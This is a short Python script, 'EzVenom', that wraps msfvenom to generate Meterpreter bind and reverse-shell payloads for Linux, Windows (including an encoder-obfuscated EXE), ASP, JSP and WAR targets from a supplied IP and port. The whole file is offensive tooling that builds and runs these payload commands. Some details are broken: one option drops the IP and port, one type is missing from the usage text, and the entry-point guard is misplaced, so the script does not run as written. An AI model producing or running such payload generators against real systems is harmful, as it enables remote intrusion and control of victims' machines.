import os
import sys

def banner():
    print("-"*17+" EzVenom "+"-"*17)
    print("\nEz MSFVenom Payloads")
    print("-"*42+"\n")

def usage():
    print("# Usage: python3 EzVenom.py <IP> <Port> <Type> ")
    print()
    print("# Types:")
    print(" * lbms : Linux Bind Meterpreter Shell")
    print(" * lmrs : Linux Meterpreter Reverse Shell")
    print(" * wmrts : Windows Meterpreter Reverse TCP Shell")
    print(" * wemwrs : Windows Encoded Meterpreter Windows Reverse Shell")
    print(" * asp : ASP Meterpreter Reverse TCP")
    print(" * jsp : JSP Java Meterpreter Reverse TCP")
    print()
    print("# Example: python3 EzVenom.py 127.0.0.1 1234 lbms")

def main():
    if len(sys.argv) != 4:
        usage()
        sys.exit()

    script , ip , port , shell = sys.argv
    shell = shell.lower()

    # Linux Bind Meterpreter Shell
    if "lbms" in shell:
        payload = f'msfvenom -p linux/x86/meterpreter/bind_tcp RHOST={ip} LPORT={port} -f elf > bind.elf'
        print("Executing: " + payload)
        os.system(payload)

    # Linux Meterpreter Reverse Shell
    elif "lmrs" in shell:
        payload = f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf > shell.elf'
        print("Executing: " + payload)
        os.system(payload)

    # Windows Meterpreter Reverse TCP Shell
    elif "wmrts" in shell:
        payload = f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe > shell.exe'
        print("Executing: " + payload)
        os.system(payload)

    # Windows Encoded Meterpreter Windows Reverse Shell
    elif "wemwrs" in shell:
        payload = f'msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe'
        print("Executing: " + payload)
        os.system(payload)
    
        # ASP Meterpreter Reverse TCP
    elif "asp" in shell:
        payload = f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f asp > shell.asp'
        print("Executing: " + payload)
        os.system(payload)
        
        # JSP Java Meterpreter Reverse TCP
    elif "jsp" in shell:
        payload = f'msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f raw > shell.jsp'
        print("Executing: " + payload)
        os.system(payload)
        
    # WAR
    elif "war" in shell:
        payload = f'msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f war > shell.war'
        print("Executing: " + payload)
        os.system(payload)
        
    else:
        print("Wrong shell type requested.. :c")
        print()
        usage()
        sys.exit()

    if __name__ == "__main__":
        banner()
        main()
